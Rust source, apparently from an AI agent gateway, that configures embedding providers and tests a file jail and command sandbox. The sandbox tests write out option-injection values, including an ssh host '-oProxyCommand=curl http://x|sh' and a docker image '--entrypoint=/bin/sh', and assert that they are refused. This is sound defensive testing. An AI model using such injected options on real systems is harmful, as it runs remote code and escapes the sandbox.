                Some(Arc::new(
                    CohereEmbeddingProvider::new(
                        key,
                        embed_config.model.clone(),
                        embed_config.base_url.clone(),
                    )
                    .with_client(embed_client.clone()),
                ))
            } else {
                warn!("skipping cohere embedding provider: no API key");
                None
            }
        }

        // =====================================
        // OLLAMA (ADICIONE ESTE BLOCO)
        // =====================================
        "ollama" => Some(Arc::new(
            OllamaEmbeddingProvider::new(embed_config.model.clone(), embed_config.base_url.clone())
                .with_client(embed_client.clone()),
        )),

        // =====================================
        // OPENAI-COMPATIBLE (LM Studio, OpenAI, etc.)
        // =====================================
        "openai" => {
            // Antes daqui saia o literal "no-key" para qualquer
            // endpoint. Contra a OpenAI oficial isso e um 401 em
            // toda chamada — e o erro era engolido logo adiante
            // (#948), entao a memoria simplesmente parava de ser
            // indexada sem ninguem saber. E a chave nem era
            // procurada no ambiente, so no arquivo de config.
            let api_key = resolve_api_key(
                embed_config.api_key.as_deref(),
                KEY_ENV_VAR_OPENAI,
                KEY_ENV_VAR_OPENAI,
            );
            let self_hosted = is_self_hosted_openai_endpoint(embed_config.base_url.as_deref());

            match (api_key, self_hosted) {
                (Some(key), _) => Some(Arc::new(
                    OpenAiEmbeddingProvider::new(
                        key,
                        embed_config.model.clone(),
                        embed_config.base_url.clone(),
                    )
                    .with_client(embed_client.clone()),
                )),
                // LM Studio, vLLM, gateway interno: nao pedem
                // credencial, e mandar um bearer vazio faz alguns
                // recusarem. O provider omite o header nesse caso.
                (None, true) => {
                    info!(
                        "openai embedding provider '{embed_name}': endpoint \
                         proprio sem credencial configurada, seguindo sem \
                         autenticacao"
                    );
                    Some(Arc::new(
                        OpenAiEmbeddingProvider::new(
                            String::new(),
                            embed_config.model.clone(),
                            embed_config.base_url.clone(),
                        )
                        .with_client(embed_client.clone()),
                    ))
                }
                (None, false) => {
                    warn!(
                        "skipping openai embedding provider '{embed_name}': \
                         sem chave no config, no cofre nem no ambiente, e o \
                         endpoint e o oficial da OpenAI — subir assim daria \
                         401 em toda chamada de embedding"
                    );
                    None
                }
            }
        }

        // =====================================
        // UNKNOWN
        // =====================================
        other => {
            warn!("unknown embedding provider type: {other}");
            None
        }
    };

    let inner = built?;
    let provider_id = inner.provider_id().to_string();
    let model = inner.model().to_string();

    // Toda saida de embeddings passa a ter retry com backoff
    // e validacao de dimensao (#962, #961) — um envelope so
    // para os tres providers, em vez de tres copias da mesma
    // logica.
    let resilient =
        ResilientEmbeddingProvider::new(inner).with_expected_dimensions(embed_config.dimensions);

    match embed_config.dimensions {
        Some(dims) => info!(
            "configured {provider_id} embedding provider: {embed_name} \
             (modelo {model}, {dims} dimensoes validadas)"
        ),
        None => info!(
            "configured {provider_id} embedding provider: {embed_name} \
             (modelo {model}; sem `dimensions` na config, o vetor \
             devolvido nao e validado — ver #961)"
        ),
    }

    Some(Arc::new(resilient))
}

/// Qual backend de busca registrar (#1034).
///
/// Escolha explicita ganha e, se faltar o que ela precisa, ninguem e
/// registrado: cair para o outro backend em silencio seria surpresa para quem
/// configurou um de proposito. Sem escolha, Brave com chave (como sempre foi)
/// e, so entao, SearXNG com URL.
pub(crate) fn select_web_search_backend(
    choice: Option<garraia_config::model::WebSearchBackend>,
    brave_key: Option<String>,
    searxng_url: Option<String>,
) -> Option<garraia_agents::tools::web_search_tool::SearchBackend> {
    use garraia_agents::tools::web_search_tool::SearchBackend;
    use garraia_config::model::WebSearchBackend;

    let brave = |api_key: String| SearchBackend::Brave { api_key };
    let searxng = |base_url: String| SearchBackend::Searxng { base_url };
    match choice {
        Some(WebSearchBackend::Brave) => brave_key.map(brave),
        Some(WebSearchBackend::Searxng) => searxng_url.map(searxng),
        None => brave_key.map(brave).or_else(|| searxng_url.map(searxng)),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ─── issue #1244: o jail chega ao ponto de registro ────────────────────
    //
    // Este repositorio ja errou cinco vezes o mesmo defeito: funcao pura bem
    // testada cujo *ponto de chamada em producao* nenhum teste exercita. O
    // proprio #1244 e uma instancia — `FileReadTool` aceitava
    // `allowed_directories`, tinha teste para ele, e os dois registros em
    // producao passavam `None`.
    //
    // Por isso estes testes NAO chamam `FileJail` nem `FileReadTool::new`:
    // eles pedem a tool ao runtime que `build_agent_runtime` montou, que e o
    // mesmo objeto que o turno do agente usa. Apagar o jail de
    // `build_agent_runtime` deixa este teste vermelho.

    fn ctx_de_sessao(working_dir: Option<&str>) -> garraia_agents::ToolContext {
        garraia_agents::ToolContext {
            session_id: "teste-1244".into(),
            user_id: None,
            is_heartbeat: false,
            approval: garraia_agents::tools::approval::ToolApproval::None,
            working_dir: working_dir.map(str::to_string),
            project_id: None,
        }
    }

    /// Um prompt que chegou pelo Telegram pede um caminho absoluto de
    /// sistema. O runtime do gateway, montado com a config default, recusa.
    #[tokio::test]
    async fn file_read_do_runtime_recusa_caminho_fora_da_raiz() {
        let tmp = tempfile::tempdir().expect("tempdir");
        let fora = std::fs::canonicalize(tmp.path()).expect("canonicalize");
        let segredo = fora.join("config.yml");
        std::fs::write(&segredo, b"api_key: sk-em-claro").expect("write");

        let runtime = build_agent_runtime(&AppConfig::default());
        let tool = runtime
            .find_tool("file_read")
            .expect("file_read tem de estar registrada");

        let erro = tool
            .execute(
                &ctx_de_sessao(None),
                serde_json::json!({ "path": segredo.to_str().expect("utf8") }),
            )
            .await
            .expect_err("caminho fora da raiz deve ser recusado");

        let msg = erro.to_string();
        assert!(
            msg.ends_with(garraia_agents::tools::file_jail::DENIAL_MESSAGE),
            "{msg}"
        );
        assert!(
            !msg.contains("config.yml"),
            "a recusa vazou o caminho: {msg}"
        );
        assert!(!msg.contains("sk-em-claro"), "{msg}");
    }

    /// E o caso legitimo segue intocado: com `working_dir` de sessao, ler
    /// dentro dele funciona sem friccao.
    #[tokio::test]
    async fn file_read_do_runtime_le_dentro_do_working_dir_da_sessao() {
        let tmp = tempfile::tempdir().expect("tempdir");
        let raiz = std::fs::canonicalize(tmp.path()).expect("canonicalize");
        std::fs::write(raiz.join("notas.md"), b"conteudo do projeto").expect("write");

        let runtime = build_agent_runtime(&AppConfig::default());
        let tool = runtime
            .find_tool("file_read")
            .expect("file_read tem de estar registrada");

        let out = tool
            .execute(
                &ctx_de_sessao(Some(raiz.to_str().expect("utf8"))),
                serde_json::json!({ "path": "notas.md" }),
            )
            .await
            .expect("dentro da raiz da sessao deve ler");

        assert!(!out.is_error, "{}", out.content);
        assert_eq!(out.content, "conteudo do projeto");
    }

    /// O mesmo para a escrita: nada e criado fora da raiz.
    #[tokio::test]
    async fn file_write_do_runtime_nao_escreve_fora_da_raiz() {
        let tmp = tempfile::tempdir().expect("tempdir");
        let fora = std::fs::canonicalize(tmp.path()).expect("canonicalize");
        let alvo = fora.join("plantado.sh");

        let runtime = build_agent_runtime(&AppConfig::default());
        let tool = runtime
            .find_tool("file_write")
            .expect("file_write tem de estar registrada");

        let erro = tool
            .execute(
                &ctx_de_sessao(None),
                serde_json::json!({ "path": alvo.to_str().expect("utf8"), "content": "carga" }),
            )
            .await
            .expect_err("escrita fora da raiz deve ser recusada");

        assert!(
            erro.to_string()
                .ends_with(garraia_agents::tools::file_jail::DENIAL_MESSAGE),
            "{erro}"
        );
        assert!(!alvo.exists(), "o arquivo foi criado fora da raiz");
    }

    /// `list_dir` tambem: e com ela que o modelo encontra o alvo antes de
    /// pedir o `file_read`.
    #[tokio::test]
    async fn list_dir_do_runtime_nao_lista_fora_da_raiz() {
        let tmp = tempfile::tempdir().expect("tempdir");
        let fora = std::fs::canonicalize(tmp.path()).expect("canonicalize");
        std::fs::write(fora.join("id_rsa"), b"PRIVATE KEY").expect("write");

        let runtime = build_agent_runtime(&AppConfig::default());
        let tool = runtime
            .find_tool("list_dir")
            .expect("list_dir tem de estar registrada");

        let out = tool
            .execute(
                &ctx_de_sessao(None),
                serde_json::json!({ "path": fora.to_str().expect("utf8") }),
            )
            .await
            .expect("tool nao deve estourar");

        assert!(out.is_error, "{}", out.content);
        assert!(!out.content.contains("id_rsa"), "{}", out.content);
    }

    /// Symlink dentro da raiz apontando para fora, pelo runtime de producao.
    #[cfg(unix)]
    #[tokio::test]
    async fn file_read_do_runtime_recusa_symlink_que_sai_da_raiz() {
        let raiz_tmp = tempfile::tempdir().expect("tempdir");
        let raiz = std::fs::canonicalize(raiz_tmp.path()).expect("canonicalize");
        let fora_tmp = tempfile::tempdir().expect("tempdir");
        let fora = std::fs::canonicalize(fora_tmp.path()).expect("canonicalize");
        std::fs::write(fora.join("id_rsa"), b"PRIVATE KEY").expect("write");
        std::os::unix::fs::symlink(&fora, raiz.join("atalho")).expect("symlink");

        let runtime = build_agent_runtime(&AppConfig::default());
        let tool = runtime
            .find_tool("file_read")
            .expect("file_read tem de estar registrada");

        let erro = tool
            .execute(
                &ctx_de_sessao(Some(raiz.to_str().expect("utf8"))),
                serde_json::json!({ "path": "atalho/id_rsa" }),
            )
            .await
            .expect_err("symlink para fora deve ser recusado");

        assert!(!erro.to_string().contains("PRIVATE KEY"), "{erro}");
        assert!(
            erro.to_string()
                .ends_with(garraia_agents::tools::file_jail::DENIAL_MESSAGE),
            "{erro}"
        );
    }

    /// #1034: a regra de escolha do backend de busca, sem subir gateway.
    #[test]
    fn web_search_backend_selection() {
        use garraia_agents::tools::web_search_tool::SearchBackend;
        use garraia_config::model::WebSearchBackend;

        let k = || Some("brave-key".to_string());
        let u = || Some("http://127.0.0.1:8081".to_string());

        // Sem secao: Brave com chave, como antes; sem chave, SearXNG com URL;
        // sem nada, nada.
        assert!(matches!(
            select_web_search_backend(None, k(), u()),
            Some(SearchBackend::Brave { .. })
        ));
        assert!(matches!(
            select_web_search_backend(None, None, u()),
            Some(SearchBackend::Searxng { ref base_url }) if base_url == "http://127.0.0.1:8081"
        ));
        assert!(select_web_search_backend(None, None, None).is_none());

        // Explicito ganha mesmo com o outro disponivel...
        assert!(matches!(
            select_web_search_backend(Some(WebSearchBackend::Searxng), k(), u()),
            Some(SearchBackend::Searxng { .. })
        ));
        assert!(matches!(
            select_web_search_backend(Some(WebSearchBackend::Brave), k(), u()),
            Some(SearchBackend::Brave { .. })
        ));
        // ...e sem o que precisa nao cai para o outro.
        assert!(select_web_search_backend(Some(WebSearchBackend::Searxng), k(), None).is_none());
        assert!(select_web_search_backend(Some(WebSearchBackend::Brave), None, u()).is_none());
    }

    /// #1033 / #1035: as ferramentas de exploracao entram no runtime sem
    /// depender de provider. `code_review` precisa de um LLM por dentro e,
    /// com config vazia, fica de fora — sem derrubar o boot e sem aparecer
    /// na lista que o modelo recebe.
    #[test]
    fn build_agent_runtime_registers_exploration_tools() {
        let runtime = build_agent_runtime(&AppConfig::default());
        let names = runtime.tool_names();
        for expected in [
            "bash",
            "file_read",
            "file_write",
            "web_fetch",
            "list_dir",
            "repo_search",
            "run_tests",
        ] {
            assert!(
                names.iter().any(|n| n == expected),
                "{expected} ausente em {names:?}"
            );
        }
        assert!(
            !names.iter().any(|n| n == "code_review"),
            "sem provider default, code_review nao pode ter sido registrada: {names:?}"
        );
    }

    /// O literal "no-key" que existia aqui tratava LM Studio e a OpenAI
    /// oficial igual. Contra a oficial isso e 401 em toda chamada; contra o
    /// endpoint proprio, seguir sem credencial e o comportamento certo.
    #[test]
    fn distinguishes_self_hosted_openai_endpoints_from_the_official_one() {
        // Sem base_url o provider assume api.openai.com — precisa de chave.
        assert!(!is_self_hosted_openai_endpoint(None));
        assert!(!is_self_hosted_openai_endpoint(Some(
            "https://api.openai.com"
        )));
        assert!(!is_self_hosted_openai_endpoint(Some(
            "https://api.openai.com/v1"
        )));

        // Endpoints proprios: nao pedem credencial.
        assert!(is_self_hosted_openai_endpoint(Some(
            "http://localhost:1234/v1"
        )));
        assert!(is_self_hosted_openai_endpoint(Some(
            "http://127.0.0.1:8000"
        )));
        assert!(is_self_hosted_openai_endpoint(Some(
            "https://llm.interno.empresa.com/v1"
        )));
    }

    #[test]
    fn build_agent_runtime_empty_config_no_crash() {
        let config = AppConfig::default();
        let _runtime = build_agent_runtime(&config);
        // Should succeed with no providers or tools crashing.
        // We do not assert `_runtime.system_prompt().is_none()` because
        // local skills in ~/.garraia/skills could be injected automatically.
    }

    #[test]
    fn build_agent_runtime_unknown_provider_skips_gracefully() {
        let mut config = AppConfig::default();
        config.llm.insert(
            "bad".to_string(),
            garraia_config::LlmProviderConfig {
                provider: "nonexistent-provider".to_string(),
                model: None,
                api_key: None,
                base_url: None,
                extra: std::collections::HashMap::new(),
            },
        );
        // Should not panic — unknown providers are logged and skipped
        let _runtime = build_agent_runtime(&config);
    }

    // ─── #1180: o default do gateway ──────────────────────────────────────

    fn llm_block(
        provider: &str,
        model: Option<&str>,
        base_url: Option<&str>,
    ) -> garraia_config::LlmProviderConfig {
        garraia_config::LlmProviderConfig {
            provider: provider.to_string(),
            model: model.map(str::to_string),
            // Chave de mentira: o loop pula todo provider com chave ausente,
            // entao sem ela o `openrouter` nem chega a ser registrado.
            api_key: Some("sk-teste-nao-e-segredo".to_string()),
            base_url: base_url.map(str::to_string),
            extra: std::collections::HashMap::new(),
        }
    }

    /// Porta fechada de proposito: o arm do ollama faz um TCP connect com
    /// 2s de teto, e `127.0.0.1:1` recusa na hora em vez de esperar o
    /// timeout inteiro. O provider e registrado de qualquer jeito.
    const OLLAMA_PORTA_FECHADA: &str = "http://127.0.0.1:1";

    /// #1180 — um bloco `openrouter` sem `model:` explicito nasce no modelo
    /// padrao do projeto. Antes desta issue o gateway respondia
    /// `openai/gpt-4o` aqui: uma quinta fonte de verdade, fora do alcance
    /// dos locks da CLI porque `garraia-cli::defaults` era `pub(crate)`.
    #[test]
    fn openrouter_sem_model_explicito_cai_no_default_do_projeto() {
        let mut config = AppConfig::default();
        config.llm.insert(
            "openrouter".to_string(),
            llm_block("openrouter", None, None),
        );

        let runtime = build_agent_runtime(&config);
        let provider = runtime
            .get_provider("openrouter")
            .expect("openrouter registrado");
        assert_eq!(
            provider.configured_model(),
            Some(garraia_config::defaults::DEFAULT_CLOUD_MODEL),
            "openrouter sem `model:` tem que herdar o default compartilhado, \
             nao um literal proprio do gateway"
        );
    }

    /// #1180 — com dois providers configurados, quem manda e
    /// `agent.default_provider`, nao a ordem em que o `HashMap` devolveu as
    /// chaves. Este teste roda o boot varias vezes justamente porque o
    /// sintoma antigo era intermitente: `register_provider` promove o
    /// PRIMEIRO provider a default, e `config.llm` e um `HashMap` com
    /// `RandomState`, entao "o Desktop nasce em OpenRouter" era sorteio.
    #[test]
    fn default_provider_configurado_vence_a_ordem_do_hashmap() {
        for _ in 0..16 {
            let mut config = AppConfig::default();
            config.llm.insert(
                "openrouter".to_string(),
                llm_block("openrouter", None, None),
            );
            config.llm.insert(
                "ollama".to_string(),
                llm_block("ollama", Some("qwen3.8:latest"), Some(OLLAMA_PORTA_FECHADA)),
            );
            config.agent.default_provider = Some("openrouter".to_string());

            let runtime = build_agent_runtime(&config);
            assert_eq!(
                runtime.default_provider_id().as_deref(),
                Some("openrouter"),
                "agent.default_provider foi ignorado no boot"
            );
        }
    }

    /// O espelho do teste acima: local-first tambem tem que valer. Sem a
    /// correcao os dois passariam ou falhariam junto, ao sabor do hasher.
    #[test]
    fn default_provider_local_tambem_e_respeitado() {
        for _ in 0..16 {
            let mut config = AppConfig::default();
            config.llm.insert(
                "openrouter".to_string(),
                llm_block("openrouter", None, None),
            );
            config.llm.insert(
                "ollama".to_string(),
                llm_block("ollama", Some("qwen3.8:latest"), Some(OLLAMA_PORTA_FECHADA)),
            );
            config.agent.default_provider = Some("ollama".to_string());

            let runtime = build_agent_runtime(&config);
            assert_eq!(
                runtime.default_provider_id().as_deref(),
                Some("ollama"),
                "agent.default_provider foi ignorado no boot"
            );
        }
    }

    /// A chave de `config.llm` e um nome escolhido pelo operador; o id que o
    /// runtime conhece e o *tipo* do provider. `default_provider: "nuvem"`
    /// com `llm.nuvem.provider: openrouter` tem que resolver mesmo assim.
    #[test]
    fn default_provider_resolve_pelo_tipo_quando_a_chave_e_um_apelido() {
        // Mesmo laco dos testes acima, e pelo mesmo motivo: com dois
        // providers registrados, uma unica rodada acerta metade das vezes
        // por sorte do hasher.
        for _ in 0..16 {
            let mut config = AppConfig::default();
            config
                .llm
                .insert("nuvem".to_string(), llm_block("openrouter", None, None));
            config.llm.insert(
                "local".to_string(),
                llm_block("ollama", Some("qwen3.8:latest"), Some(OLLAMA_PORTA_FECHADA)),
            );
            config.agent.default_provider = Some("nuvem".to_string());

            let runtime = build_agent_runtime(&config);
            assert_eq!(
                runtime.default_provider_id().as_deref(),
                Some("openrouter"),
                "o apelido devia ter resolvido para o tipo registrado"
            );
        }
    }

    /// Fail-safe: um `agent.default_provider` que nao corresponde a nenhum
    /// provider registrado (chave errada, provider pulado por falta de
    /// chave) avisa no log e mantem o que havia — nunca derruba o boot.
    #[test]
    fn default_provider_inexistente_nao_quebra_o_boot() {
        let mut config = AppConfig::default();
        config.llm.insert(
            "openrouter".to_string(),
            llm_block("openrouter", None, None),
        );
        config.agent.default_provider = Some("provider-que-nao-existe".to_string());

        let runtime = build_agent_runtime(&config);
        assert_eq!(
            runtime.default_provider_id().as_deref(),
            Some("openrouter"),
            "o unico provider registrado devia ter permanecido como default"
        );
    }

    // ─── #1244 rodada 2: o aviso de raiz perigosa chega ao boot ───────────

    /// `raizes_perigosas` e funcao pura com teste proprio em `garraia-agents`;
    /// o que **este** teste impede e a repeticao do defeito da propria #1244 —
    /// nucleo testado, call site nao exercitado. O aviso so vale se
    /// `build_agent_runtime` o emitir, e nao ha como observar um `warn!` sem
    /// montar subscriber, entao varre-se o fonte, como ja se faz com o
    /// `spinner.rs` da CLI e o `detect.rs` do desktop-core.
    #[test]
    fn o_boot_avisa_sobre_raiz_de_file_tool_perigosa() {
        let fonte = include_str!("mod.rs");
        // As agulhas sao montadas em tempo de execucao de proposito: escritas
        // por extenso elas apareceriam neste proprio fonte e o teste passaria
        // sozinho — que e exatamente o teste vacuo que esta rodada esta
        // matando.
        let chamada = format!("file_jail.{}()", "raizes_perigosas");
        assert!(
            fonte.contains(&chamada),
            "o boot deixou de avisar sobre raiz de file tool que desliga o jail (#1244)"
        );
        let env = format!("GARRAIA_{}_ROOTS", "FILE");
        assert!(
            fonte.contains(&env),
            "o aviso de boot tem de citar a env, que e a raiz que o config check nao via"
        );
    }

    /// E o `info!` tem de dizer **quais** raizes, nao so quantas: contar nao
    /// distingue `agent.file_roots: [/srv/dados]` de `GARRAIA_FILE_ROOTS=/`.
    #[test]
    fn o_boot_nomeia_as_raizes_de_file_tool() {
        let fonte = include_str!("mod.rs");
        let trecho = fonte
            .split("file tools confinadas a {} raiz(es)")
            .nth(1)
            .expect("a linha de info das raizes sumiu");
        assert!(
            trecho.starts_with(" de agent.file_roots + working_dir da sessao: {}"),
            "o info do boot voltou a contar raizes sem nomea-las (#1244)"
        );
    }

    /// `garraia-config` nao depende de `garraia-agents`, entao o nome da env
    /// que amplia o jail existe escrito nos dois lados. Este crate e o unico
    /// que ve os dois: se divergirem, o `config check` passa a validar uma
    /// variavel que ninguem le, e a que o `FileJail` le volta a nao ser
    /// validada por ninguem — que e exatamente o F4 desta rodada.
    #[test]
    fn os_dois_lados_conhecem_a_mesma_env_de_file_roots() {
        assert_eq!(
            garraia_agents::tools::file_jail::ROOTS_ENV,
            garraia_config::check::FILE_ROOTS_ENV,
        );
    }

    // ─── #952: a politica de ruido, config <-> agents ─────────────────────

    /// `garraia-agents` nao depende de `garraia-config` (de proposito: a
    /// politica chega la como dado puro), entao o piso de caracteres e a
    /// faixa aceita existem escritos **duas vezes**. Este crate e o unico
    /// que ve os dois lados, e este teste e o que impede os dois numeros de
    /// divergirem em silencio — o sintoma seria um `config check` aceitando
    /// um valor que a politica trata de outro jeito.
    #[test]
    fn os_dois_lados_da_politica_de_ruido_concordam_nos_numeros() {
        assert_eq!(
            garraia_agents::DEFAULT_MIN_CHARS,
            garraia_config::model::IngestionConfig::default().min_chars,
            "default do piso divergiu entre garraia-agents e garraia-config"
        );
        assert_eq!(
            garraia_agents::MIN_CHARS_MAX,
            garraia_config::model::INGESTION_MIN_CHARS_MAX,
            "teto do piso divergiu entre garraia-agents e garraia-config"
        );
    }

    /// A config default tem que produzir a politica default. Se o bootstrap
    /// deixasse de ler alguma chave, o gateway rodaria com uma politica e o
    /// `garra memory reindex` com outra — e o reindex desfaria o filtro.
    #[test]
    fn config_default_produz_a_politica_default() {
        let config = AppConfig::default();
        assert_eq!(
            noise_policy_from_config(&config),
            garraia_agents::NoisePolicy::default()
        );
    }

    #[test]
    fn filter_noise_false_desliga_a_politica() {
        let mut config = AppConfig::default();
        config.memory.ingestion.filter_noise = false;
        let policy = noise_policy_from_config(&config);
        assert!(!policy.is_enabled());
        assert!(!policy.is_noise("oi"));
    }

    #[test]
    fn extras_da_config_chegam_na_politica() {
        let mut config = AppConfig::default();
        config.memory.ingestion.extra_noise_phrases = vec!["salve familia".to_string()];
        let policy = noise_policy_from_config(&config);
        assert!(policy.is_noise("Salve, familia!"));
        assert!(
            policy.is_noise("bom dia"),
            "a lista padrao continua valendo"
        );
    }

    // ─── #1225: agent.sandbox -> SandboxPolicy ────────────────────────────

    /// #1225 C2: prende o espelho. `garraia_config::TOOLS_SANDBOXAVEIS` e uma
    /// copia, a mao, do conjunto de tools que de fato consultam a
    /// `SandboxPolicy` — a lista mora em `garraia-config` porque a aresta
    /// `config -> agents` (que arrastaria db, security e hardware) seria pior
    /// que a duplicacao, e esta crate e a unica que ve as duas.
    ///
    /// O dano de dessincronizar e **direcional**, e e por isso que vale um
    /// teste: quando a slice S2/S3 envolver `run_tests`, esquecer de atualizar
    /// a const NAO abre o sandbox — faz o `config check` emitir um Warning
    /// ativamente falso ("`run_tests` is not a tool the sandbox can wrap
    /// today"), mandando o operador remover uma entrada que funciona.
    /// Conselho errado num controle de seguranca e pior que conselho nenhum.
    ///
    /// Varre o fonte, no idioma ja usado em `mcp_server.rs` e em
    /// `desktop-core/src/detect.rs`. Cobre as tools que existem hoje; uma
    /// tool NOVA que passe a envolver sem entrar nesta tabela escapa — nesse
    /// caso a tabela abaixo e que precisa crescer, junto com a const.
    #[test]
    fn tools_sandboxaveis_espelha_quem_de_fato_chama_wrap_command() {
        // (nome registrado pela tool, fonte dela)
        let fontes: [(&str, &str); 5] = [
            (
                "bash",
                include_str!("../../../garraia-agents/src/tools/bash_tool.rs"),
            ),
            (
                "run_tests",
                include_str!("../../../garraia-agents/src/tools/run_tests_tool.rs"),
            ),
            (
                "git_diff",
                include_str!("../../../garraia-agents/src/tools/git_diff_tool.rs"),
            ),
            (
                "code_review",
                include_str!("../../../garraia-agents/src/tools/code_review_tool.rs"),
            ),
            (
                "repo_search",
                include_str!("../../../garraia-agents/src/tools/repo_search_tool.rs"),
            ),
        ];

        let mut envolvem: Vec<&str> = Vec::new();
        for (nome, fonte) in fontes {
            // So a metade de producao: um teste que mencione `wrap_command`
            // nao significa que a tool envolva comando nenhum.
            let producao = fonte.split("#[cfg(test)]").next().unwrap_or(fonte);
            if producao.contains("sandbox.wrap_command(") {
                envolvem.push(nome);
            }
        }
        envolvem.sort_unstable();

        let mut declaradas: Vec<&str> = garraia_config::sandbox::TOOLS_SANDBOXAVEIS.to_vec();
        declaradas.sort_unstable();

        assert_eq!(
            envolvem, declaradas,
            "garraia_config::TOOLS_SANDBOXAVEIS ({declaradas:?}) divergiu das tools que \
             realmente chamam `sandbox.wrap_command(` ({envolvem:?}). Atualize a const em \
             `crates/garraia-config/src/sandbox.rs` — senao o `garra config check` passa a \
             dar conselho falso ao operador sobre `sandboxed_tools`/`elevated`."
        );
    }

    #[test]
    fn sandbox_secao_ausente_e_identica_ao_default_da_policy() {
        let config = AppConfig::default();
        assert_eq!(
            sandbox_policy_from(&config.agent.sandbox),
            SandboxPolicy::default(),
            "instalacao sem `agent.sandbox` nao pode mudar de comportamento"
        );
        assert!(!sandbox_policy_from(&config.agent.sandbox).requires_sandbox("bash"));
    }

    #[test]
    fn sandbox_docker_completo_atravessa_todos_os_campos() {
        let mut config = AppConfig::default();
        config.agent.sandbox = garraia_config::SandboxConfig {
            mode: garraia_config::SandboxMode::All,
            backend: Some(garraia_config::SandboxBackendKind::Docker),
            image: Some("alpine:3.20".into()),
            ssh_host: None,
            sandboxed_tools: vec!["bash".into()],
            elevated: vec!["web_fetch".into()],
            mount_workdir: false,
            network_disabled: false,
        };
        let p = sandbox_policy_from(&config.agent.sandbox);
        assert_eq!(p.mode, SandboxMode::All);
        assert_eq!(p.backend, Some(SandboxBackend::Docker));
        assert_eq!(p.image, "alpine:3.20");
        assert_eq!(p.sandboxed_tools, vec!["bash".to_string()]);
        assert_eq!(p.elevated, vec!["web_fetch".to_string()]);
        assert!(!p.mount_workdir);
        assert!(!p.network_disabled);
        assert!(p.requires_sandbox("bash"));
        assert!(!p.requires_sandbox("web_fetch"), "elevated escapa");
    }

    #[test]
    fn sandbox_ssh_host_vira_a_variante_com_payload() {
        let mut config = AppConfig::default();
        config.agent.sandbox.mode = garraia_config::SandboxMode::All;
        config.agent.sandbox.backend = Some(garraia_config::SandboxBackendKind::Ssh);
        config.agent.sandbox.ssh_host = Some("  box.interno  ".into());
        let p = sandbox_policy_from(&config.agent.sandbox);
        assert_eq!(
            p.backend,
            Some(SandboxBackend::Ssh("box.interno".into())),
            "o host e trimado antes de entrar na linha de comando"
        );
    }

    /// Fail-closed: `backend = ssh` sem host NAO vira docker, nao vira host,
    /// nao vira `mode = off`. Fica sem backend, e `wrap_command` recusa cada
    /// comando. Um fallback silencioso aqui seria pior do que o bug da #1225.
    #[test]
    fn sandbox_ssh_sem_host_nao_constroi_backend_e_falha_fechado() {
        let mut config = AppConfig::default();
        config.agent.sandbox.mode = garraia_config::SandboxMode::All;
        config.agent.sandbox.backend = Some(garraia_config::SandboxBackendKind::Ssh);
        config.agent.sandbox.ssh_host = Some("   ".into());
        let p = sandbox_policy_from(&config.agent.sandbox);
        assert_eq!(p.backend, None);
        assert_eq!(p.mode, SandboxMode::All, "o modo NAO e rebaixado para off");
        assert!(p.requires_sandbox("bash"));
        let err = p
            .wrap_command("bash", "echo nunca", "/tmp")
            .expect_err("sem backend o comando tem de ser recusado");
        assert!(err.to_string().contains("nenhum backend"), "err = {err}");
    }

    /// `image` vazia cai no default da policy — nunca vira uma imagem vazia
    /// na linha do `docker run`.
    #[test]
    fn sandbox_image_em_branco_cai_no_default_da_policy() {
        let mut config = AppConfig::default();
        config.agent.sandbox.mode = garraia_config::SandboxMode::All;
        config.agent.sandbox.backend = Some(garraia_config::SandboxBackendKind::Podman);
        config.agent.sandbox.image = Some("   ".into());
        let p = sandbox_policy_from(&config.agent.sandbox);
        assert_eq!(p.image, SandboxPolicy::default().image);
        assert!(!p.image.trim().is_empty());
    }

    /// #1225 F1: `ssh_host` que comeca com `-` nao vira backend. O `ssh` le
    /// o token como flag (o host fica ANTES do `--`), e `-oProxyCommand=…`
    /// executaria no host LOCAL, pulando o `safety_gate`. Recusar e a
    /// resposta certa: nenhum host de verdade comeca com `-`.
    #[test]
    fn sandbox_ssh_host_que_parece_opcao_nao_vira_backend() {
        for hostil in [
            "-oProxyCommand=curl http://x|sh",
            "--rsh=sh",
            "  -oProxyCommand=x",
        ] {
            let mut config = AppConfig::default();
            config.agent.sandbox.mode = garraia_config::SandboxMode::All;
            config.agent.sandbox.backend = Some(garraia_config::SandboxBackendKind::Ssh);
            config.agent.sandbox.ssh_host = Some(hostil.into());
            let p = sandbox_policy_from(&config.agent.sandbox);
            assert_eq!(p.backend, None, "host hostil aceito: {hostil:?}");
            let err = p
                .wrap_command("bash", "echo nunca", "/tmp")
                .expect_err("sem backend o comando e recusado");
            assert!(err.to_string().contains("nenhum backend"), "err = {err}");
        }
    }

    /// Mesma classe no `image`, que e posicional do `docker run`: cai no
    /// default em vez de virar opcao.
    #[test]
    fn sandbox_image_que_parece_opcao_cai_no_default() {
        let mut config = AppConfig::default();
        config.agent.sandbox.mode = garraia_config::SandboxMode::All;
        config.agent.sandbox.backend = Some(garraia_config::SandboxBackendKind::Docker);
        config.agent.sandbox.image = Some("--entrypoint=/bin/sh".into());
        let p = sandbox_policy_from(&config.agent.sandbox);
        assert_eq!(p.image, SandboxPolicy::default().image);
    }

    /// Um host legitimo com hifen no MEIO continua passando — o guard e
    /// sobre a primeira posicao, nao sobre o caractere.
    #[test]
    fn sandbox_host_com_hifen_no_meio_continua_valido() {
        let mut config = AppConfig::default();
        config.agent.sandbox.mode = garraia_config::SandboxMode::All;
        config.agent.sandbox.backend = Some(garraia_config::SandboxBackendKind::Ssh);
        config.agent.sandbox.ssh_host = Some("build-box-01.interno".into());
        let p = sandbox_policy_from(&config.agent.sandbox);
        assert_eq!(
            p.backend,
            Some(SandboxBackend::Ssh("build-box-01.interno".into()))
        );
    }

    /// #1225 F4: a policy compara nome por igualdade exata, entao um espaco
    /// vindo da lista YAML seria um item que existe no arquivo e nao existe
    /// para o codigo. Caixa NAO e normalizada: o registry e case-sensitive e
    /// "consertar" `Bash` aqui esconderia o erro do operador.
    #[test]
    fn sandbox_nomes_de_tool_sao_trimados_mas_nao_normalizados() {
        let mut config = AppConfig::default();
        config.agent.sandbox.mode = garraia_config::SandboxMode::Allowlist;
        config.agent.sandbox.backend = Some(garraia_config::SandboxBackendKind::Docker);
        config.agent.sandbox.sandboxed_tools =
            vec![" bash ".into(), "".into(), "   ".into(), "Bash".into()];
        config.agent.sandbox.elevated = vec!["\tweb_fetch\n".into()];
        let p = sandbox_policy_from(&config.agent.sandbox);
        assert_eq!(
            p.sandboxed_tools,
            vec!["bash".to_string(), "Bash".to_string()],
            "entradas vazias somem, o resto e so trimado"
        );
